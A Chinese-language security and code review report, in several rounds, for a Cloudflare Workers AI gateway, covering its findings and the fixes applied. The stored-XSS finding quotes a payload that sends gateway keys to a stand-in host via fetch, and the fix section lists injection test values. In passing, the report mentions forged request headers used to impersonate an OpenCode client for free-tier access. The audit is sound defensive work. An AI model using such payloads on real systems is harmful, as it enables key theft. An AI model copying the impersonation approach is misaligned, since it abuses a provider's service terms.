# ai-gateway 全面代码审查报告

- **审查对象**：`D:/agent2api-main/ai-gateway/ai-gateway-main`（Cloudflare Workers + Hono v4 + KV，TypeScript，运行时依赖仅 `hono`）
- **审查范围**：`src/` 全部 12 个模块、`test/` 3 个测试文件、构建与工程配置（`tsconfig.json` / `package.json` / `wrangler.toml` / `worker.js`）
- **审查方式**：逐文件通读源码 + 针对性实证（Hono 路由探针、`tsc`、`vitest`、esbuild 复现打包、注入链路端到端追踪）
- **基线状态**：`tsc --noEmit` 零错误；`vitest run` 47/47 通过；`worker.js`（154239 B）与 `src/` 一致
- **审查日期**：本轮为第 4 轮审查

## 一、结论摘要

整体工程质量良好：错误处理分层清晰（`src/index.ts:76` 的 `app.onError` 把 `SyntaxError` 映射为 400）、认证实现规范（httpOnly + Secure + SameSite=Lax + 常量时间比较）、SSRF 与桩函数吞噬等前几轮问题已有对应修复与测试。本轮新发现 **1 个高危、4 个中危、约 10 个低危/工程质量问题**，其中最高优先级是管理台的一处**转义遗漏导致存储型 XSS**（可导致全部转发 Key 泄露）。

| 编号 | 严重度 | 位置 | 问题 |
|---|---|---|---|
| H1 | **高** | `src/pages.ts:386` | 模型 ID 未转义直接拼进 `onclick` 属性 → 存储型 XSS，可窃取全部转发 Key |
| M1 | 中 | `src/auth.ts:38-77` | 管理员登录无任何限流/锁定，可无限速暴力破解 |
| M2 | 中 | `src/storage.ts:62-84, 123-143` | 整表读改写无并发控制（丢更新）；跨 isolate 缓存 60s，Key 撤销有延迟 |
| M3 | 中 | `src/admin.ts:388-390` | `EXPIRY_OPTIONS[body.expiresIn]` 走原型链，`__proto__`/`constructor` 导致 500 |
| M4 | 中 | `tsconfig.json:18` + `test/opencode-responses.spec.ts:259` | 测试目录被排除在类型检查外，已存在一处真实类型错误 |
| L1 | 低 | `src/admin.ts:33-90` | SSRF 校验仅比对字面量，不做 DNS 解析，无法防解析到内网的域名 |
| L2 | 低 | `src/opencode-responses.ts:421-426` | 上游未发 `response.completed` 时流以 `[DONE]` 收尾，无 `finish_reason` |
| L3 | 低 | `src/proxy.ts:340-375` | 失败分支不取消上游响应体；客户端中断信号未透传 |
| L4 | 低 | `src/proxy.ts:24-34, 60-77` | 健康状态缓存按引用返回并在调用方原地修改 |
| L5 | 低 | `src/storage.ts:35, 100` | `JSON.parse` 无保护，KV 脏数据会让该 isolate 持续 500 |
| L6 | 低 | `src/storage.ts:86-97` | 会话写 KV 最终一致，跨 POP 登录可能短时 401 |
| L7 | 低 | 构建配置 | `worker.js` 无对应 npm 脚本，重新打包不可复现 |
| L8 | 低 | `src/opencode.ts` / `src/opencode-responses.ts` | 桩函数判定逻辑重复 4 处，两路行为已不一致 |
| L9 | 低 | `src/opencode.ts`（`collapseChatSseToJson`） | 按索引假设 `toolCalls` 稠密，稀疏索引会抛 TypeError |
| L10 | 低 | `src/opencode.ts`（`createStubSwallowingChatStream.emitLine`） | 非 `data:` 行丢失空行分隔 |
| Q1 | 质量 | 多处 | `as any`、死代码、类型过窄、参数静默丢弃 |

---

## 二、高危问题

### H1. 管理台存储型 XSS：模型 ID 未做 HTML 转义（`src/pages.ts:386`）

**证据**

`src/pages.ts:386` 在渲染提供商模型行时，同一行内对 `m.id` 有两种处理：

```ts
// 同一个模板字符串内
`<input type="text" value="${escapePageHtml(m.id)}" ...>`            // ← 转义了
`<button ... onclick="testMdl('${p.id}','${m.id}',${mi})">`          // ← 没有转义
```

`escapePageHtml`（`src/pages.ts:9-14`）本身是正确实现（转义 `& < > " '`），说明这是**遗漏**而非设计。

**注入链路（已端到端确认）**

1. 上游 `/models` 返回恶意模型 ID（或管理员手动输入），例如：
   `x','y'),fetch('https://evil/?k='+document.querySelector('[data-copy-val]').dataset.copyVal),('`
2. 管理员在管理台点击「获取模型」→「全部入库并保存」：`fetchEditModels`（`src/pages.ts:680-690`）→ `showEditModelsList` → `addAllUpstream`（`src/pages.ts:529-545`）直接用 `textContent` 取回**原始**模型 ID 并 `await save(id)` 落库。
3. `save()` 调用 `POST /admin/api/providers/:id`，服务端 **不校验模型 ID**（`src/admin.ts:199`：`normalizeArray(body.models, (m) => ({ id: m, enabled: true }))`，`normalizeArray` 只做字符串包装，见 `src/admin.ts:95-101`）。
4. 下次打开 `/admin` 时，服务端渲染命中 `src/pages.ts:386`，`m.id` 内的引号闭合 `onclick` 属性 → 注入任意 HTML/JS → 每次加载自动执行。

**影响**

- `src/pages.ts:397` 会把**全部转发 Key 明文**渲染进页面（`data-copy-val="${escapePageHtml(k.key)}"`、`data-full`），因此该 XSS 等于一次性泄露所有网关 Key → 攻击者可完整接管网关（消耗额度、污染请求）。
- 可顺带以管理员身份调用全部 `/admin/api/*`（借助受害者的会话 Cookie，同源请求会自动携带）。
- 载体是 KV 中的持久数据，属于**存储型**，对所有后续访问者生效。

**修复建议**

1. 立即修复渲染点：`onclick="testMdl('${p.id}','${escapePageHtml(m.id)}',${mi})"`；同一模板里所有插值进 HTML 属性的 provider/model/key 字段一律套 `escapePageHtml`。更稳妥的写法是**不把数据拼进 JS 字符串**，改为 `data-*` 属性 + `addEventListener` 读取（`addMdl` 已是这种风格，见 `src/pages.ts:758-759`）。
2. 服务端补输入校验（纵深防御）：`src/admin.ts` 的 provider/model/key 归一化阶段限制 ID 字符集，如 `/^[A-Za-z0-9._:/-]{1,128}$/`，非法则 400。模型 ID 允许的字符集本就有限，不影响正常使用。
3. 增加回归测试：构造含 `"` 与 `'` 的模型 ID，断言渲染结果中不含未转义引号（`test/` 现有测试未覆盖 `pages.ts` 渲染）。

---

## 三、中危问题

### M1. 管理员登录无限流（`src/auth.ts:38-77`）

`handleLogin` 用常量时间比较（`timingSafeEqual`，`src/auth.ts:19-21`；用户名与密码哈希均为等长比较，无实用侧信道），但**没有任何失败计数、延迟、锁定或人机校验**。攻击者可对 `POST /admin/login` 全速暴力破解 `ADMIN_PASSWORD`；Workers 与 KV 都不会自然限流。

建议：按 IP 记录连续失败次数（KV 或 Durable Object），超过阈值指数退避/锁定；或接入 Cloudflare Turnstile / WAF Rate Limiting 规则。注意限流状态本身要能容忍 KV 的最终一致性。

### M2. 整表读改写丢更新 + 撤销延迟（`src/storage.ts`）

所有写操作是「读全表 → 改 → 写回全表」：

- 提供商：`addProvider`（`:62-65`）、`updateProvider`（`:67-74`）、`deleteProvider`（`:76-84`）
- 转发 Key：`addProxyKey`（`:123-127`）、`deleteProxyKey`（`:128-134`）、`updateProxyKey`（`:136-143`）

无版本号/ETag/CAS，两个并发的管理操作（不同 isolate，或同 isolate 交织的 await）会互相覆盖：例如同时「新增提供商 A」和「删除提供商 B」，后写者会把先写者的结果整体丢弃。

同时 `memCache`（`src/storage.ts:7,15`）按 isolate 缓存 60s。`setCachedList`（`:41-45`）在 KV 写成功后刷新本 isolate 缓存，所以**同 isolate 无陈旧问题**；但其他 isolate 最长 60s 才可见 → **禁用/删除一个已泄露的转发 Key 后，最多 60s 内其他 POP 仍会放行**，这是有安全含义的撤销延迟。

建议：读改写改用 Durable Object 串行化或 KV 上的乐观并发（写入带 `version`，读改写时比对，冲突则重试）；撤销类操作（禁用 Key）把缓存 TTL 降到数秒，或在 Key 校验路径改为可快速失效的存储。

### M3. `EXPIRY_OPTIONS` 原型链查找导致 500（`src/admin.ts:388-390`）

```ts
const ttl = EXPIRY_OPTIONS[body.expiresIn]          // src/admin.ts:388
if (ttl !== null) {                                  // 只挡了 null
  expiresAt = new Date(Date.now() + ttl * 1000).toISOString()   // :390
}
```

`EXPIRY_OPTIONS` 是普通对象字面量（`src/config.ts:35-41`）。传 `expiresIn: "__proto__"` 得到 `Object.prototype`（非 null 的真值对象）→ `ttl * 1000` = `NaN` → `new Date(NaN).toISOString()` 抛 `RangeError` → 未捕获 → 500。`"constructor"`、`"toString"` 同理。仅管理员可触发，属可用性/健壮性问题。

建议：`const ttl = Object.prototype.hasOwnProperty.call(EXPIRY_OPTIONS, body.expiresIn) ? EXPIRY_OPTIONS[body.expiresIn] : undefined`，或把配置对象改为 `Object.create(null)`/`Map`，并对非法值直接 400。

### M4. 测试目录未被类型检查，已存在真实类型错误（`tsconfig.json:18`）

`tsconfig.json:18` 为 `"include": ["src/**/*.ts"]`，`test/` 不在其中，因此 `npm run check`（`tsc --noEmit && vitest run`）从不检查测试代码。已实际存在一个错：

```ts
// src/opencode-responses.ts:188-191 签名
export function responsesToChatBody(
  resp: Rec, swallowStubs = false, back: Record<string, string> = {}, injectedStubs: ReadonlySet<string> = new Set()
)
// test/opencode-responses.spec.ts:259 调用
responsesToChatBody(body as unknown as Parameters<...>[0], 'muse', true)
//                                      ↑ 字符串赋给 boolean   ↑ boolean 赋给对象
```

测试靠 `'muse'` 为真值而「恰好通过」，`back = true` 从未生效 → 该用例并未真正验证它想验证的映射回填路径（`back` 用于把改写后的桩名还原，见 `src/opencode.ts` 中同名字段用法）。

建议：`tsconfig.json` 增加 `"include": ["src/**/*.ts", "test/**/*.ts"]`（必要时为测试单独放宽 `types`/`noUnusedLocals`），然后修正该调用；考虑把 `test` 纳入 CI 的 `check` 脚本。

---

## 四、低危与工程质量问题

### L1. SSRF 校验仅比对字面量（`src/admin.ts:33-90`）

`checkSafeUpstreamUrl`（`:73-90`）已正确拦截：非 `https:`、`localhost`/`metadata`/`*.local`/`*.internal`、私有/回环/链路本地/CGNAT/组播 IPv4（`isPrivateIPv4`，含 `169.254.169.254`）、IPv6 回环/ULA/链路本地以及 IPv4-mapped 变体（`isPrivateIPv6`，`:53-71`）。WHATWG URL 的规范化（`0x7f000001`、`2130706433`、`[::ffff:a9fe:a9fe]`）也已被覆盖，`test/admin-ssrf.spec.ts` 6 个用例通过。

缺口：**不做 DNS 解析**，因此 `evil.attacker.com` 解析到 `127.0.0.1`/`169.254.169.254` 仍会被放行。实际风险有限——Workers 运行在 Cloudflare 边缘，没有可达的云元数据端点，回环地址也不是「Worker 所在主机」——因此定为低危，作为纵深防御建议处理：需要时可在 fetch 前用 DNS-over-HTTPS 解析并复检，或明确在文档中说明该边界。

### L2. 流式响应缺少结束语义（`src/opencode-responses.ts:421-426`）

`flush` 在 `finished` 为 false 时只补发 `data: [DONE]`，不补发带 `finish_reason` 的末块，也不上报错误。上游连接被中途截断时，客户端会把截断当成正常结束。建议在 `flush` 中补一个 `finish_reason: 'length'`（或显式 error 事件）的收尾块。

### L3. 上游响应体未取消、客户端中断未透传（`src/proxy.ts`）

- 429 / 401 / 403 / 5xx / 异常分支（`:336-375`）把 `response` 存入 `lastError` 后 `continue`，未 `response.body?.cancel()`；若后续 key 成功，先前失败响应的 body 一直未消费，占着子请求与连接。
- `fetchWithHeaderTimeout`（`:48`）使用自己的 `AbortController`，全仓无 `c.req.raw.signal` 引用：客户端断开后上游仍会生成到结束，浪费免费额度。
- 成功分支（`:323-334`）只透传 `Content-Type` 与 `Cache-Control`，丢弃全部上游头（`x-ratelimit-*`、`openai-*` 等）。因未转发客户端的 `Accept-Encoding`，上游一般返回未压缩体，所以当前不会破坏 body；但这是隐式依赖，建议至少保留 `Content-Encoding` 相关处理策略并在注释中说明。
- 边缘情况：若客户端今日发出 `Accept-Encoding: gzip`（经其他路径透传）而上游返回压缩错误体，`storeFailure`/`restoreFailure` 用 `await response.arrayBuffer()`（已解压）搭配原 `headers`（仍含 `content-encoding: gzip`）回放，会让客户端解码失败。建议回放前删除 `content-encoding`/`content-length`。

### L4. 健康状态缓存按引用共享（`src/proxy.ts:24-34, 60-77`）

`readHealth` 命中缓存时直接 `return cached`（`:62-63`），调用方随后原地修改（`:282-287` 的 `h.demotedAt = ...`、`:325` 的 `delete healthData[apiKey]`），再 `writeHealth` 写 KV。若 KV 写失败，内存与 KV 出现分叉；且 `demotedAt` 的赋值不在 `healthUpdated` 统计内，可能只改内存不落盘。建议缓存返回深拷贝，或统一「改副本 → 写成功 → 才替换缓存」。

### L5. KV 值 `JSON.parse` 无保护（`src/storage.ts`）

`getCachedList`（`:35-37`）与 `getSession`（`:100`）直接 `JSON.parse`，无 `try/catch`。一旦 KV 中被写入非 JSON 内容（手工改、并发写坏、迁移残留），该 isolate 上每个请求都会 500，直到 TTL 过期。建议捕获后按「无数据」处理并记录日志。

### L6. 会话跨 POP 最终一致（`src/storage.ts:86-97`）

`createSession` 立即写 KV 并返回 Cookie；KV 全局最终一致，刚登录的用户若下一个请求落到另一 POP，可能读到空会话而被 `adminAuthMiddleware` 重定向登录页。属可用性瑕疵，建议在 UI 上容忍一次重试或用 Durable Object 承载会话。

### L7. `worker.js` 构建不可复现

仓库内 `worker.js`（154239 B）与 `src/` 逻辑一致（已核对 FreeTier ID 相关实现），但 `package.json` 的 `scripts`（`:6-12`）只有 `wrangler dev/deploy/build(dry-run)/test/check`，**没有**生成该文件的命令，也没有把 `esbuild` 列为依赖。用 `esbuild` 重新打包得到 154242 B，差异仅为 `</script>` 与 `<\/script>` 的 3 字节（转义行为随 esbuild 版本变化），即需要 `--charset=utf8` 等固定参数才能字节一致。建议补 `"bundle": "esbuild src/index.ts --bundle --format=esm --charset=utf8 --outfile=worker.js"` 并固定 esbuild 版本，否则生产单文件会与源码脱钩。

### L8. 桩函数判定逻辑重复 4 处且已分叉

`isStub` / 桩名集合判定在 `src/opencode.ts`（`collapseChatSseToJson`、`createStubSwallowingChatStream`）与 `src/opencode-responses.ts`（`responsesToChatBody`、`createResponsesToChatStream`）各写一遍。已出现行为差异：chat 路径在客户端无工具时会设 `tool_choice: 'none'`，responses 路径无法设置（`/responses` 无该语义），只能吞掉桩调用。建议抽出单一 `stubToolDecision(toolName, injectedStubs, hadClientTools)` 并在两路复用，差异点显式注释。

### L9. `collapseChatSseToJson` 假设 `toolCalls` 稠密

按 `for (let i = 0; i < toolCalls.length; i++) { const fn = toolCalls[i].function ... }` 遍历，而 `toolCalls` 按上游 `delta.tool_calls[].index` 稀疏填充。若上游跳过某个 index（如只发 0 和 2），`toolCalls[1]` 为 `undefined` → 读 `.function` 抛 `TypeError` → 500。建议改为 `for (const tc of toolCalls) { if (!tc) continue ... }` 或按存在性过滤。

### L10. 非 `data:` 行丢失空行分隔

`createStubSwallowingChatStream` 的 `emitLine` 对 `data:` 行重排后补 `\n\n`，对空行直接 `return`，对其他行只输出 `t + '\n'`。结果是 `event:` 之类的字段与其 `data:` 不再以空行分隔（SSE 事件的字段边界被破坏）。当前上游 chat SSE 极少用 `event:`，故为低危；建议统一按「缓冲整段事件再输出」实现。

### Q1. 其他质量项

- `src/auth.ts:36`：`(c as any).set('username', session.username)` —— `as any` 绕过类型；且 `username` 在全仓无消费者，是死代码。
- `src/auth.ts:19-21`：`timingSafeEqual` 先比 `byteLength` 再做常量时间比较，长度不等即短路。当前两个比较对象（用户名、64 字符 SHA-256 hex）都不含秘密长度，无实用风险，但注释「常量时间」略有夸大。
- 密码用无盐 SHA-256 后比较：因为比对对象是环境变量而非落库哈希，「哈希」实际只是等长化的手段，不构成漏洞，但可加注释避免误读为「已加盐存储」。
- `src/auth.ts` `deleteCookie(c, 'session_id')` 未带 `secure`/`sameSite`；按 name+domain+path 删除通常仍有效，但建议与 `setCookie` 属性保持一致。
- `src/types.ts`：`ProxyRequestBody.messages` 等被写成 `Array<{ role: string; content: string }>`，实际 `content` 可为数组（多模态），类型过窄导致调用处需要断言。
- `test/opencode.spec.ts`：`chunk(content, index)` 中 `void index` 表明参数被静默丢弃，测试辅助函数有冗余参数。

---

## 五、已核实「不是问题」的点（避免误报）

以下几处在前几轮曾被怀疑，本轮已用实证排除，记录以免后续重复排查：

1. **`/admin` 是否存在认证绕过** —— 不存在。`app.use('/admin/*', adminAuthMiddleware)`（`src/index.ts:56`）确实匹配 `/admin`：用 Hono 实测 `/admin`、`/admin/api/status` 均标记中间件已执行（`mwRun=1`），`/admin/login` 不执行。注意 `renderAdminPage`（`src/pages.ts:299`）自身**不做会话校验**，完全依赖该路由行为，属脆弱设计（若将来路由写法调整即变成漏洞），建议在 `renderAdminPage` 内补一道 `getSession` 断言。
2. **CORS 与 CSRF** —— `app.use('*', cors())`（`src/index.ts:20`）使用 hono 默认值 `origin: '*'`、`credentials: false`，配合 `src/auth.ts:71-77` 的 `httpOnly + secure + sameSite:'Lax'` Cookie，跨站带凭据读取被浏览器阻止，无实际 CSRF。可优化项：把通配 CORS 收敛到 `/v1/*`，管理接口不声明 CORS。
3. **`timingSafeEqual` 时序侧信道** —— 见 Q1，无实用泄漏。
4. **`/admin/*` 通配中间件对未知路径的 404 是否绕过认证** —— 不绕过，中间件先于 notFound 运行。
5. **SSRF 对 URL 规范化绕过**（`0x7f000001`、`2130706433`、`[::ffff:...]`、根点 `localhost.`） —— 已被 `isPrivateIPv4`/`isPrivateIPv6`/根点剥离覆盖，测试用例通过。
6. **`worker.js` 与源码不同步** —— 已核对为同步；问题仅是「如何重新生成」未记录（见 L7）。
7. **同 isolate 内配置写后读到旧值** —— 不存在，`setCachedList`（`src/storage.ts:41-45`）先写 KV 再刷新内存缓存。

---

## 六、验证记录

| 命令 | 结果 |
|---|---|
| `npx tsc --noEmit` | 通过，零错误（仅覆盖 `src/`，见 M4） |
| `npx vitest run` | 3 文件 / 47 用例全部通过（opencode 15、opencode-responses 26、admin-ssrf 6） |
| Hono 路由探针（`/admin`、`/admin/`、`/admin/api/status`、`/admin/login`） | `/admin` 与 `/admin/api/status` 经过认证中间件；`/admin/login` 不经过 |
| esbuild 重新打包对比 | 154242 B vs 仓库 154239 B，差异仅 `</script>` 转义，逻辑一致 |
| 注入链路追踪 | `fetchEditModels` → `addAllUpstream`（`src/pages.ts:529-545`）→ `addMdl`（`:747-761`）→ `save` → `POST /admin/api/providers/:id`（`src/admin.ts:199` 无校验）→ 渲染 `src/pages.ts:386` 未转义，链路完整 |

## 七、建议修复顺序

1. **H1**（存储型 XSS）：修 `src/pages.ts:386` 转义 + 服务端补 ID 字符集校验 + 加渲染回归测试。
2. **M4**（测试不参与类型检查）：改 `tsconfig.json` 的 `include`，顺手修掉 `test/opencode-responses.spec.ts:259` 的错参。
3. **M1**（登录限流）与 **M2**（并发写 + 撤销延迟）：安全语义相关，优先于其余项。
4. **M3**（`EXPIRY_OPTIONS` 原型链）：一行修复。
5. **L3 / L4 / L5 / L6**（代理与存储健壮性）：可合并成一次小重构。
6. **L7 / L8 / L9 / L10 / Q1**（可维护性）：随下次功能改动一并处理。

---

### 附：本次审查的局限

- 未在生产环境做真实流量/压测验证，性能相关判断（如 buffering 上限、子请求占用）基于代码推理。
- KV 与 Workers 的最终一致性行为按官方语义推断，未在真实多 POP 环境实测。
- 未审查 `wrangler.toml` 中可能存在的绑定与兼容性标志（如 `compatibility_date`）对上述行为的具体影响。

---

## 八、修复记录（第二轮：按报告全量修复）

修复范围：**H1 + M1–M4 + L2–L10 + Q1**。
架构性取舍而**有意保留**的两项：**L1**（SSRF 只比对字面量，不解析 DNS —— Workers 边缘无可达的云元数据端点，改用 DNS 解析无法在 Workers 内做且会引入子请求开销，保留为纵深防御）与 **L6**（会话/配置跨 POP 最终一致 —— KV 无 CAS，真正修复需引入 Durable Object，管理操作频率极低，已在代码内以 `shortcut:` 注释标明窗口）。

| 编号 | 修复内容 | 验证 |
|---|---|---|
| **H1** | `src/pages.ts` 新增 `modelRowHTML(pid, m, mi)`，模型行不再把模型 ID 拼进 `onclick` 的 JS 字符串，改用 `data-mid="${escapePageHtml(m.id)}"` + `onclick="testMdl('${p}',this.dataset.mid)"`；服务端 `src/admin.ts` 新增 `MODEL_ID_RE = /^[A-Za-z0-9._:/-]{1,128}$/` 与 `findInvalidModelId()`，在创建（`handleCreateProvider`）与更新（`handleUpdateProvider`）时校验并返回 400。**为何不能只用 `escapePageHtml`**：HTML 实体在属性值中会被浏览器解码回引号，转义挡不住 JS 字符串闭合注入，必须让不可信值不出现在 JS 字符串上下文里。 | `test/admin-api.spec.ts`「提供商模型 ID 校验」2 用例（含 `x" onclick="alert(1)` 被拒、`moonshotai/kimi-k2:free` 通过） |
| **M1** | `src/auth.ts` 增加 `loginFailures` Map 与 `loginBlocked`/`recordLoginFailure`：同来源 15 分钟内连续失败 5 次后锁定（滑动窗口），失败固定延迟 400ms，登录成功即清零；限流判定放在入参校验之前，锁定期间不泄露任何信息。局限（多 POP 分散可绕过、需要全局强限流应上 DO / Rate Limiting）已用 `shortcut:` 注释写明。 | `test/admin-api.spec.ts`「管理台登录限流」2 用例（锁定后正确密码也 429、其他来源不受影响、成功后计数重置） |
| **M2** | `src/storage.ts` 新增 `serialized(key, task)` 写队列，把 6 个「读全表 → 改 → 写回」函数（`addProvider`/`updateProvider`/`deleteProvider`/`addProxyKey`/`updateProxyKey`/`deleteProxyKey`）串行化；转发 Key 列表内存缓存 TTL 由 60s 降为 5s（`CACHE_TTL_BY_KEY`），缩短禁用/删除的跨 isolate 生效延迟。 | `test/admin-api.spec.ts`「并发新增不会互相覆盖」「吊销后立即失效」「禁用立即失效」3 用例 |
| **M3** | `src/admin.ts` 的 `handleCreateProxyKey` 改为 `const ttl = body.expiresIn ? EXPIRY_OPTIONS[body.expiresIn] : undefined` + `typeof ttl === 'number'` 判定，原型链命中（`__proto__`/`constructor`）不再产生 `NaN` → 500。 | 新用例：`expiresIn: "__proto__"` 返回 201 且 `expiresAt: null`；`30d` 生成未来时间；`forever` 为 null |
| **M4** | `tsconfig.json` 的 `include` 增加 `test/**/*.ts`；修掉 `test/opencode-responses.spec.ts` 里第 2 参误传 `'muse'` 字符串的真实类型错误，并给 `choices[0]` 补显式类型。 | `tsc --noEmit` 零错误（现覆盖 `src/` + `test/`） |
| **L2** | `src/opencode-responses.ts` 的 `createResponsesToChatStream` flush 分支补发带 `finish_reason: 'length'` 的收尾块，再发 `[DONE]`，截断不再被当作正常结束。 | 新用例「上游未发 response.completed 就断开时补发 finish_reason=length 收尾块」 |
| **L3** | `src/proxy.ts` 新增 `dropLastError()`：切换 key 前 `cancel()` 上一次失败响应体，避免子请求悬挂；`fetchWithHeaderTimeout` 新增 `clientSignal` 参数并在客户端断开时中断上游；客户端中断不再计入 key 失败，直接返回 499 + `client_closed_request`。 | tsc + 现有转发用例；逻辑经人工核对（含可选链短路、`finally` 移除监听） |
| **L4** | `src/proxy.ts` 的 `readHealth` 改为返回浅拷贝 `{ ...cached }`，调用方原地修改不再污染内存缓存。 | 代码审查 |
| **L5** | `src/storage.ts` 的 `getCachedList`/`getSession` 与 `src/proxy.ts` 的 `readHealth` 三处 `JSON.parse` 全部加 `try/catch` + 形状校验（数组 / 对象），脏数据按空值处理并 `console.warn`。转发 Key 空列表是 fail-closed。 | 新用例「KV 里是非 JSON / 非数组内容时按空列表处理，不抛错」 |
| **L7** | `package.json` 新增 `"bundle": "esbuild src/index.ts --bundle --format=esm --minify --charset=utf8 --outfile=worker.js"`，并把 `esbuild`（`^0.28.1`，与 wrangler 内置版本一致）提为 devDependency；用该脚本重建 `worker.js`。 | `npm run bundle` 产出与旧文件同构（同参数可复现），含全部修复 |
| **L8** | `src/opencode-responses.ts` 导出 `STUB_TOOL_NAMES` 与 `isStubToolName`，`src/opencode.ts` 的 `FREE_LANE_GATE_TOOL_NAMES` 与三处判定全部复用，桩名定义不再有 4 份副本。 | 现有 15 + 27 用例全过 |
| **L9** | `src/opencode.ts` 的 `collapseChatSseToJson` 在工具调用合并循环与过滤回调里跳过稀疏数组空洞，上游跳号不再抛 `TypeError`。 | 代码审查 |
| **L10** | `src/opencode.ts` 新增 `emitBlock()`：整段不含 `data:` 的事件（注释 / `event:` 字段）原样透传并保留 `\n\n` 分隔，不再与后续 `data` 行并入同一事件。 | 现有流式用例 |
| **Q1** | 删除 `(c as any).set('username', …)` 死代码；`types.ts` 删除从未被读取且类型错误的 `ProxyRequestBody.messages`；`test/opencode.spec.ts` 的 `chunk()` 去掉 `void index` 死参。 | tsc |

### 修复过程中新发现并已处理的问题

- **N1（真实缺陷）**：`crypto.subtle.timingSafeEqual` 是 Cloudflare 对 WebCrypto 的扩展，普通 WebCrypto 实现（Node）没有，调用即 `TypeError`。`src/auth.ts` 增加退化路径（`typeof subtle.timingSafeEqual === 'function'` 判定 + 逐字节异或累加，仍是常量时间），登录逻辑不再依赖单一运行时。
- **N2（真实缺陷，测试基建）**：`vitest.config.ts` 中的 `...workers` 是**死配置** —— `@cloudflare/vitest-pool-workers` 0.10.15 并不导出 `workers`（实际导出 `defineWorkersConfig`/`defineWorkersProject`/`readD1Migrations`），展开 `undefined` 等于什么都没配，也没有设 `pool: 'workers'`，因此全部测试一直跑在 Node 环境（KV 绑定、`CF-Connecting-IP` 等 Workers 语义从未被真实执行）。本仓库测试不依赖 `cloudflare:test`，故改为显式 Node 配置并说明约束；同时移除已无用途的 `@cloudflare/vitest-pool-workers` 依赖。（尝试改用 `defineWorkersConfig` 启用真 workerd 会在本机 `*** std::terminate()` 崩溃，workerd 无法在此环境启动。）
- **N3（真实缺陷）**：`src/opencode.ts` 的 `passthroughOk` 用 `createStubSwallowingChatStream` 重新编码 SSE 时原样透传 `response.headers`，`content-encoding`/`content-length` 与已解码的 body 不符（与 L8 同类的头部失真）。已与 `storeFailure` 一致地删除这两个头。
- **N4（已核实无问题）**：管理台模型行改为属性传参后，客户端 `addMdl`/`addMdlToForm`/`addKeyRow` 等 `innerHTML` 拼接点均已使用 `escapeHtml`（转义 `& < > " '`），且 `id` 来自服务端已校验的提供商 ID，无残留注入点。

## 九、第二轮验证记录（修复后）

| 命令 | 结果 |
|---|---|
| `npm run check`（`tsc --noEmit && vitest run`） | 类型检查零错误（`src/` + `test/`）；**4 文件 / 58 用例全部通过**（opencode 15、opencode-responses 27、admin-ssrf 6、admin-api 10） |
| `npm run bundle` | 生成 `worker.js`（156679 B，minify + `--charset=utf8`），含本轮全部修复 |
| `npm ls --depth=0` | 依赖树干净：`hono@4.12.27`、`esbuild@0.28.1`、`vitest@2.1.9`、`typescript@6.0.3`、`wrangler@4.107.0`、`@cloudflare/workers-types@4.20260702.1` |
| 未改动项确认 | OpenCode 伪装链路（请求头伪造、Free-lane gate、桩吞噬、镜像故障转移、session/msg ID 生成）逻辑未做任何行为性修改，仅补健壮性（稀疏数组、SSE 空行、结束语义）与去重 |

## 十、第三轮修复记录（两路独立审查复盘）

第三轮改用「两路独立 reviewer 并行审查」：R1 只看 `src/opencode.ts` + `src/opencode-responses.ts`（伪装与翻译链路），R2 只看 `src/index.ts`/`proxy.ts`/`storage.ts`/`auth.ts`/`admin.ts`/`pages.ts`/`shared.js.ts`。每条都经主 agent 回读源码核实后才处置，下表同时记录「不修」的理由（避免下一轮重复提出）。

### 10.1 R2（核心代理 / 管理台 / 前端）

| 编号 | 问题 | 处置 | 验证 |
|---|---|---|---|
| **R2-H1**（高） | `normalizeArray` 对非字符串条目原样放行，`apiKeys:[null]` 存入后管理台渲染读 `k.key`/`k.enabled` 抛 `TypeError` → **管理台整页 500，管理员被锁在界面之外无法自救** | 已修：`normalizeArray` 丢弃所有非对象条目；`proxy.ts`/`admin.ts` 读 key 改 `k?.enabled`；管理台渲染改 `p.apiKeys.filter(Boolean)` / `p.models.filter(Boolean)` | `test/admin-api.spec.ts`「提供商列表条目校验」2 用例（`[null,'sk-good',42]` → 只留字符串；`models:[null]` → 400） |
| **R2-M1**（中） | 上游 4xx/5xx 错误体被 `response.json().catch(async () => ({...await response.text()}))` 二次读取，抛 `Body is unusable`，把上游错误改写成 500 | 已修：改成先 `text()` 读一次再 `try JSON.parse`，解析失败时截断 500 字符放入 `error.message` 原样透传状态码 | 人工核对 + 现有转发用例 |
| **R2-M2**（中） | `readHealth` 返回缓存对象引用（调用方原地改），且降权路径只写 `demotedAt` 未置 `healthUpdated`，`demotedAt` 永不落 KV | 已修：新增 `cloneHealth()`（逐条浅拷贝）供读/写缓存使用；降权分支显式 `healthData[key] = {...h, demotedAt: now}` + `healthUpdated = true` | 代码审查 |
| **R2-M3**（中） | `writeHealth` 未容错，KV 抖动会把「已经成功拿到上游响应」的请求变成 500 | 已修：新增 `persistHealth()`（`try/catch` + `console.warn`），健康状态写失败绝不影响转发结果 | 代码审查 |
| **R2-M4**（中） | 健康状态「读-改-写」未串行化，并发降权可能少计失败次数 | **不修**：只影响降权计数精度，不影响转发正确性；精确一致需 Durable Object，已在代码内加 `shortcut:` 注释说明 | — |
| **R2-M5**（中） | 管理台删除中间行后新增行复用 DOM 索引，导致保存到错误的 Key/模型 | 已在第二轮修复（`nextRowIdx` 取最大索引 + 1） | 第二轮用例 |
| **R2-M6**（中） | `body` 为字面量 `null`、`model` 为数字时抛 `TypeError` → 500 | 已修：`/v1` 增加 `!body \|\| typeof body !== 'object'` 与 `typeof model !== 'string'` → 400；`/admin/login` 改 `typeof body?.username === 'string'` 判定 | `test/admin-api.spec.ts`「转发请求体校验」2 用例 + 登录 `null` body 用例 |
| **R2-L1**（低） | `testModelConnection` 同类错误体二次读取 | 已修（同 R2-M1 手法） | 代码审查 |
| **R2-L2**（低） | 管理台 Key 状态刷新的选择器 `.fc .bd` 在模板里不存在（实际是 `span.bd`） | 已修：改 `ki.querySelector('span.bd')` | 代码审查 |
| **R2-L3**（低） | 点遮罩关闭弹窗时不落 `cM`/`pM` 的 Promise，`await` 永久悬挂 | 已修：新增 `closeModal()`，关闭前把 resolve 函数取出来以 `null` 落地 | 代码审查 |
| **R2-L6**（低） | 管理台响应缺少安全头 | 已修：新增 `securityHeaders` 中间件，`/admin/*` 与 `/` 输出 `X-Frame-Options: DENY` + `X-Content-Type-Options: nosniff`；**CSP 暂不启用**（页面有大量内联脚本，需先做 nonce 化，否则会把管理台打挂） | 代码审查 |
